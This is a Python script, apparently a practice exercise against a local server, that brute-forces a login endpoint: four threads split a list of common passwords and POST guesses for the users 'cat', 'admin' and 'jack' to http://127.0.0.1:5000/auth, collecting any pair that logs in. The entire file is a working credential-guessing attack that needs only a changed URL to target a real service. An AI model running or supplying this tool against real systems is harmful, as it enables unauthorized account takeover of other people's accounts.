import sys
import time
import requests
import threading

with open('probable-v2-top12000.txt') as f:
    content = f.read()
    password_list = content.split('\n')
Dlina = len(password_list)
p = password_list[:2500]
p1 = password_list[2500:5000]
p2 = password_list[5000:7500]
p3 = password_list[7500:10000]
pass_list = []
users = ['cat', 'admin', 'jack']


def auth_p():
    global password_list
    global pass_list
    global users
    global p
    i = 0
    gg = 0
    pas = 0
    p1len = len(p)
    count = len(users)
    while gg == 0:
        for password in p:
            print('P_pass - '+str(password), ' i- ' +
                  str(i), ' '+str(pas)+'/2500')
            response = requests.post('http://127.0.0.1:5000/auth',
                                     json={'login': users[i], 'password': password})
            # print(users[i])
            if pas == p1len:
                i += 1
                pas = 0
            if response.status_code == 200:
                pass_list.append(users[i] + ' - ' + str(password))
                i += 1
                pas = 0
                break
            pas += 1

            if i == count:  # p1len*3:
                gg += 1
                break
        #     time.sleep(5)
        # онон не плюсует если по пользователю 0


def auth_p1():
    global password_list
    global pass_list
    global users
    global p1
    i = 0
    gg = 0
    pas = 0
    p1len = len(p1)
    count = len(users)
    while gg == 0:
        for password in p1:
            print('P_pass - '+str(password), ' i- ' +
                  str(i), ' '+str(pas)+'/2500')
            response = requests.post('http://127.0.0.1:5000/auth',
                                     json={'login': users[i], 'password': password})
            # print(users[i])
            if pas == p1len:
                i += 1
                pas = 0
            if response.status_code == 200:
                pass_list.append(users[i] + ' - ' + str(password))
                i += 1
                pas = 0
                break
            pas += 1

            if i == count:  # p1len*3:
                gg += 1
                break


def auth_p2():
    global password_list
    global pass_list
    global users
    global p2
    i = 0
    gg = 0
    pas = 0
    p1len = len(p2)
    count = len(users)
    while gg == 0:
        for password in p2:
            print('P_pass - '+str(password), ' i- ' +
                  str(i), ' '+str(pas)+'/2500')
            response = requests.post('http://127.0.0.1:5000/auth',
                                     json={'login': users[i], 'password': password})
            # print(users[i])
            if pas == p1len:
                i += 1
                pas = 0
            if response.status_code == 200:
                pass_list.append(users[i] + ' - ' + str(password))
                i += 1
                pas = 0
                break
            pas += 1

            if i == count:  # p1len*3:
                gg += 1
                break


def auth_p3():
    global password_list
    global pass_list
    global users
    global p3
    i = 0
    gg = 0
    pas = 0
    p1len = len(p3)
    count = len(users)
    while gg == 0:
        for password in p3:
            print('P_pass - '+str(password), ' i- ' +
                  str(i), ' '+str(pas)+'/2500')
            response = requests.post('http://127.0.0.1:5000/auth',
                                     json={'login': users[i], 'password': password})
            # print(users[i])
            if pas == p1len:
                i += 1
                pas = 0
            if response.status_code == 200:
                pass_list.append(users[i] + ' - ' + str(password))
                i += 1
                pas = 0
                break
            pas += 1

            if i == count:  # p1len*3:
                gg += 1
                break


t = threading.Thread(target=auth_p)
t1 = threading.Thread(target=auth_p1)
t2 = threading.Thread(target=auth_p2)
t3 = threading.Thread(target=auth_p3)
start = time.time()

t.start()
t1.start()
t2.start()
t3.start()
# print(f'{t.name} стратовал.')
# print(f'{t2.name} стратовал.')

t.join()
t1.join()
t2.join()
t3.join()
end = time.time()
time = end-start
print(pass_list, time)
